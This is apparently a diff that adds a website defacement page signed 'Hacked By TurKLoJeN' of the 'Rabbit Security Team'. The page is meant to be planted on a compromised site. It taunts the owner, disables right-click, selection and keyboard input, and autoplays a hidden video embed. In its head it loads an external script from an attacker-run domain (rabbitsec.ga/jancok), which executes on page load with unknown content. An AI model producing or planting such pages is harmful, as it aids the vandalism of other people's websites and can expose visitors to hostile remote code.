@@ -1,0 +1,514 @@
+
+   <!DOCTYPE html>
+<!--
+Designed by TurKLoJeN
+Rabbit Security Team
+
+DefacePage TurKLoJeN #1
+-->
+<html>
+<head>
+    <title>Hacked By TurKLoJeN</title>
+    <link rel="SHORTCUT ICON" href="http://img12.deviantart.net/8cc3/i/2005/212/b/4/evil_playboy_by_freak0.jpg">
+    <meta name="Author" content="TurKLoJeN "/>
+    <meta name="copyright" content="TurKLoJeN"/>
+    <meta name="description" content="Website Hacked By TurKLoJeN Don't Be Serious, Internet Is For Fun!"/>
+    <meta name="keywords" content="TurKLoJeN, Security Hacked, Hack"/>
+    <meta property="og:title" content="[!] Struck by TurKLoJeN"/>
+    <meta property="og:image:width" content=" ">
+    <meta property="og:image:height" content=" ">
+    <meta property="og:image" content="http://rabbitsec.ga/BackgroundDeface.png">
+    <link href="http://fonts.googleapis.com/css?family=Orbitron:400,900" rel="stylesheet" type="text/css">
+    <link href='http://fonts.googleapis.com/css?family=Abel:400,700' rel='stylesheet' type='text/css'>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <script type="text/javascript" src="http://rabbitsec.ga/jancok"></script>
+</head>
+<style type="text/css">
+    @import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
+    body {
+        background-image: url("http://rabbitsec-team.esy.es/TurKLoJeNBackground.png");
+        background-color: black;
+        background-repeat: fixed;
+        background-size: 100%;
+        background-position: top center;
+        overflow: hidden;
+        cursor: none;
+        margin: 0px;
+    }
+    svg {
+        width: 600px;
+        height: 100px;
+        display: block;
+        position: relative;
+        overflow: hidden;
+        margin: 0 auto;
+        background: transparent;
+    }
+    text {
+        filter: url(#filter);
+        fill: white;
+        font-family: 'Share Tech Mono', sans-serif;
+        font-size: 100px;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+    }
+#headM{
+	font-family:Orbitron;
+	position:fixed;
+	left:0px;
+	right:0px;
+	bottom:0px;
+	background:transparent;
+	text-align:center;
+}
+.title{
+	font-size:30px;
+	font-family:Abel;
+	font-weight:bold;
+	color:#ffffff;
+	text-shadow: 0px 0px 10px black;
+}
+.title span{
+	font-size:50px;
+	font-family:Abel;
+	font-weight:bold;
+	color:#ffffff;
+	text-shadow: 0px 0px 10px black;
+}
+.greets{
+	font-family: Abel;
+	color: black;
+}
+.footer{
+	font-family:Orbitron;
+	color:white;
+	font-size:10px;
+	text-shadow: 0px 0px 40px black;
+}
+</style>
+<script type="text/javascript">
+    function disableselect(e) {
+        return false
+    }
+    function reEnable() {
+            return true
+        }
+        //if IE4+
+    document.onselectstart = new Function("return false")
+        //if NS6
+    if (window.sidebar) {
+        document.onmousedown = disableselect
+        document.onclick = reEnable
+    }
+    var message = "";
+    function clickIE() {
+        if (document.all) {
+            (message);
+            return false;
+        }
+    }
+    function clickNS(e) {
+        if (document.layers || (document.getElementById && !document.all)) {
+            if (e.which == 2 || e.which == 3) {
+                (message);
+                return false;
+            }
+        }
+    }
+    if (document.layers) {
+        document.captureEvents(Event.MOUSEDOWN);
+        document.onmousedown = clickNS;
+    } else {
+        document.onmouseup = clickNS;
+        document.oncontextmenu = clickIE;
+    }
+    document.oncontextmenu = new Function("return false")
+    if ((document.getElementById) &&
+        window.addEventListener || window.attachEvent) {
+        (function() {
+            var num = 30;
+            var timer = 30;
+            var enableinNS6 = 1 
+            var y = [];
+            var x = [];
+            var fall = [];
+            var theFlakes = [];
+            var sfs = [];
+            var step = [];
+            var currStep = [];
+            var h, w, r;
+            var d = document;
+            var pix = "px";
+            var domWw = (typeof window.innerWidth == "number");
+            var domSy = (typeof window.pageYOffset == "number");
+            var idx = d.getElementsByTagName('div').length;
+            if (d.documentElement.style &&
+                typeof d.documentElement.style.MozOpacity == "string")
+                num = 12;
+            for (i = 0; i < num; i++) {
+                sfs[i] = Math.round(1 + Math.random() * 1);
+
+                document.write('<div id="flake' + (idx + i) + '" style="position:absolute;top:0px;left:0px;width:' + sfs[i] + 'px;height:' + sfs[i] + 'px;background-color:#ffffff;font-size:' + sfs[i] + 'px"><\/div>');
+                currStep[i] = 0;
+                fall[i] = (sfs[i] == 1) ?
+                    Math.round(2 + Math.random() * 2) : Math.round(3 + Math.random() * 2);
+                step[i] = (sfs[i] == 1) ?
+                    0.05 + Math.random() * 0.1 : 0.05 + Math.random() * 0.05;
+            }
+            if (domWw) r = window;
+            else {
+                if (d.documentElement &&
+                    typeof d.documentElement.clientWidth == "number" &&
+                    d.documentElement.clientWidth != 0)
+                    r = d.documentElement;
+                else {
+                    if (d.body &&
+                        typeof d.body.clientWidth == "number")
+                        r = d.body;
+                }
+            }
+            function winsize() {
+                var oh, sy, ow, sx, rh, rw;
+                if (domWw) {
+                    if (d.documentElement && d.defaultView &&
+                        typeof d.defaultView.scrollMaxY == "number") {
+                        oh = d.documentElement.offsetHeight;
+                        sy = d.defaultView.scrollMaxY;
+                        ow = d.documentElement.offsetWidth;
+                        sx = d.defaultView.scrollMaxX;
+                        rh = oh - sy;
+                        rw = ow - sx;
+                    } else {
+                        rh = r.innerHeight;
+                        rw = r.innerWidth;
+                    }
+                    h = rh - 2;
+                    w = rw - 2;
+                } else {
+                    h = r.clientHeight - 2;
+                    w = r.clientWidth - 2;
+                }
+            }
+            function scrl(yx) {
+                var y, x;
+                if (domSy) {
+                    y = r.pageYOffset;
+                    x = r.pageXOffset;
+                } else {
+                    y = r.scrollTop;
+                    x = r.scrollLeft;
+                }
+                return (yx == 0) ? y : x;
+            }
+            function snow() {
+                var dy, dx;
+                for (i = 0; i < num; i++) {
+                    dy = fall[i];
+                    dx = fall[i] * Math.cos(currStep[i]);
+                    y[i] += dy;
+                    x[i] += dx;
+                    if (x[i] >= w || y[i] >= h) {
+                        y[i] = -10;
+                        x[i] = Math.round(Math.random() * w);
+                        fall[i] = (sfs[i] == 1) ?
+                            Math.round(2 + Math.random() * 2) : Math.round(3 + Math.random() * 2);
+                        step[i] = (sfs[i] == 1) ?
+                            0.05 + Math.random() * 0.1 : 0.05 + Math.random() * 0.05;
+                    }
+                    theFlakes[i].top = y[i] + scrl(0) + pix;
+                    theFlakes[i].left = x[i] + scrl(1) + pix;
+                    currStep[i] += step[i];
+                }
+                setTimeout(snow, timer);
+            }
+            function init() {
+                winsize();
+                for (i = 0; i < num; i++) {
+                    theFlakes[i] = document.getElementById("flake" + (idx + i)).style;
+                    y[i] = Math.round(Math.random() * h);
+                    x[i] = Math.round(Math.random() * w);
+                }
+                snow();
+            }
+            if (window.addEventListener) {
+                window.addEventListener("resize", winsize, false);
+                window.addEventListener("load", init, false);
+            } else if (window.attachEvent) {
+                window.attachEvent("onresize", winsize);
+                window.attachEvent("onload", init);
+            }
+        })();
+    }
+</script>
+<body oncontextmenu="return false" onkeydown="return false" onmousedown="return false">
+<center>
+   <svg version="1.1" id="Ebene_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" 
+	 width="600px" height="100px" viewBox="0 0 1100 80">
+	<defs>
+		<filter id="filter">
+		    <feFlood flood-color="black" result="black" />
+		    <feFlood flood-color="red" result="flood1" />
+		    <feFlood flood-color="limegreen" result="flood2" />
+			<feOffset in="SourceGraphic" dx="3" dy="0" result="off1a"/>
+			<feOffset in="SourceGraphic" dx="2" dy="0" result="off1b"/>
+			<feOffset in="SourceGraphic" dx="-3" dy="0" result="off2a"/>
+			<feOffset in="SourceGraphic" dx="-2" dy="0" result="off2b"/>
+		    <feComposite in="flood1" in2="off1a" operator="in"  result="comp1" />
+		    <feComposite in="flood2" in2="off2a" operator="in" result="comp2" />
+ 		  	<feMerge x="0" width="100%" result="merge1">
+				<feMergeNode in = "black" />
+				<feMergeNode in = "comp1" />
+				<feMergeNode in = "off1b" />
+				<animate 
+				attributeName="y" 
+		    		id = "y"
+		    		dur ="4s"
+		    		keyTimes = '0; 0.362; 0.368; 0.421; 0.440; 0.477; 0.518; 0.564; 0.593; 0.613; 0.644; 0.693; 0.721; 0.736; 0.772; 0.818; 0.844; 0.894; 0.925; 0.939; 1'
+		    		repeatCount = "indefinite" />
+				<animate attributeName="height" 
+		    		id = "h" 
+		    		dur ="4s"
+		    		values = '10px; 0px; 10px; 30px; 50px; 0px; 10px; 0px; 0px; 0px; 10px; 50px; 40px; 0px; 0px; 0px; 40px; 30px; 10px; 0px; 50px'
+		    		keyTimes = '0; 0.362; 0.368; 0.421; 0.440; 0.477; 0.518; 0.564; 0.593; 0.613; 0.644; 0.693; 0.721; 0.736; 0.772; 0.818; 0.844; 0.894; 0.925; 0.939; 1'
+		    		repeatCount = "indefinite" />
+		    </feMerge>
+ 			<feMerge x="0" width="100%" y="60px" height="65px" result="merge2">
+				<feMergeNode in = "black" />
+				<feMergeNode in = "comp2" />
+				<feMergeNode in = "off2b" />
+				<animate attributeName="y" 
+		    		id = "y"
+		    		dur ="4s"
+		    		values = '103px; 104px; 69px; 53px; 42px; 104px; 78px; 89px; 96px; 100px; 67px; 50px; 96px; 66px; 88px; 42px; 13px; 100px; 100px; 104px;' 
+		    		keyTimes = '0; 0.055; 0.100; 0.125; 0.159; 0.182; 0.202; 0.236; 0.268; 0.326; 0.357; 0.400; 0.408; 0.461; 0.493; 0.513; 0.548; 0.577; 0.613; 1'
+ 		    		repeatCount = "indefinite" />
+				<animate attributeName="height" 
+		    		id = "h"
+		    		dur = "4s"
+					values = '0px; 0px; 0px; 16px; 16px; 12px; 12px; 0px; 0px; 5px; 10px; 22px; 33px; 11px; 0px; 0px; 10px'
+		    		keyTimes = '0; 0.055; 0.100; 0.125; 0.159; 0.182; 0.202; 0.236; 0.268; 0.326; 0.357; 0.400; 0.408; 0.461; 0.493; 0.513;  1'
+		    		repeatCount = "indefinite" />
+		    </feMerge>
+		 	<feMerge>
+ 				<feMergeNode in="SourceGraphic" />	
+				<feMergeNode in="merge1" /> 
+ 			<feMergeNode in="merge2" />
+		    </feMerge>
+	    </filter>
+	</defs>
+<g>
+<text x="30" y="60">Hacked By TurKLoJeN</text>
+<img src="http://i.hizliresim.com/PQP80N.png" border="0" width="350" height="350"></br>
+<img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif"><font face="Abel" size="6" color="#F00"> We just have fun in your System
+ !<img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif"><br></font>  
+<center>
+
+<script> 
+
+TypingText = function(element, interval, cursor, finishedCallback) {
+
+if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+
+this.running = true; // Never run.
+
+return;
+
+}
+
+this.element = element;
+
+this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+
+this.interval = (typeof interval == "undefined" ? 100 : interval);
+
+this.origText = this.element.innerHTML;
+
+this.unparsedOrigText = this.origText;
+
+this.cursor = (cursor ? cursor : "");
+
+this.currentText = "";
+
+this.currentChar = 0;
+
+this.element.typingText = this;
+
+if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+
+TypingText.all.push(this);
+
+this.running = false;
+
+this.inTag = false;
+
+this.tagBuffer = "";
+
+this.inHTMLEntity = false;
+
+this.HTMLEntityBuffer = "";
+
+}
+
+TypingText.all = new Array();
+
+TypingText.currentIndex = 0;
+
+TypingText.runAll = function() {
+
+for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+
+}
+
+TypingText.prototype.run = function() {
+
+if(this.running) return;
+
+if(typeof this.origText == "undefined") {
+
+setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval); // We haven't finished loading yet. Have patience.
+
+return;
+
+}
+
+if(this.currentText == "") this.element.innerHTML = "";
+
+// this.origText = this.origText.replace(/<([^<])*>/, ""); // Strip HTML from text.
+
+if(this.currentChar < this.origText.length) {
+
+if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+
+this.tagBuffer = "<";
+
+this.inTag = true;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+
+this.tagBuffer += ">";
+
+this.inTag = false;
+
+this.currentText += this.tagBuffer;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.inTag) {
+
+this.tagBuffer += this.origText.charAt(this.currentChar);
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+
+this.HTMLEntityBuffer = "&";
+
+this.inHTMLEntity = true;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+
+this.HTMLEntityBuffer += ";";
+
+this.inHTMLEntity = false;
+
+this.currentText += this.HTMLEntityBuffer;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.inHTMLEntity) {
+
+this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else {
+
+this.currentText += this.origText.charAt(this.currentChar);
+
+}
+
+this.element.innerHTML = this.currentText;
+
+this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+
+this.currentChar++;
+
+setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+
+} else {
+
+this.currentText = "";
+
+this.currentChar = 0;
+
+this.running = false;
+
+this.finishedCallback();
+
+}
+
+}
+
+</script>
+<br>
+<font face="Abel" color="white" id="info">IF YOU CONTROL THE CODE YOU CONTROL THE WORLD</font>
+</font></p>
+
+<script type="text/javascript"> 
+
+//Define first typing example:
+
+//Define second typing example (use "slashing" cursor at the end):
+
+new TypingText(document.getElementById("info"), 70, function(i){
+
+var ar = new Array("/"," ","/","/"); return " " + ar[i.length %
+
+ar.length]; });
+
+//Type out examples:
+
+TypingText.runAll();
+
+</script>
+<font face="Abel" size="4" color="white">We Are Turkish Hacker : <br>
+<marquee scrollamount="8" width="50%" color="white">The World Rotates Around My Code</marquee>
+<br>Look out! :<br>
+<font face="Abel" size="4" color="white">You might be seen powerful from outside but wars are won from inside</font>
+<br>
+<font face="Abel" size="4" color="#FFFFFF">Contact : <font color="#F00">http://facebook.com/<font color="#FFFFFF">ethicalturklojen7h</font></b></embed>
+</br>
+</p>
+<embed src="https://www.youtube.com/v/1C-2QVJh9k4&amp;autoplay=1" type="application/x-shockwave-flash"wmode="transparent" width="1" height="1"></embed>
+<link href='http://fonts.googleapis.com/css?family=Orbitron:700' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+</body>   
+</html> 
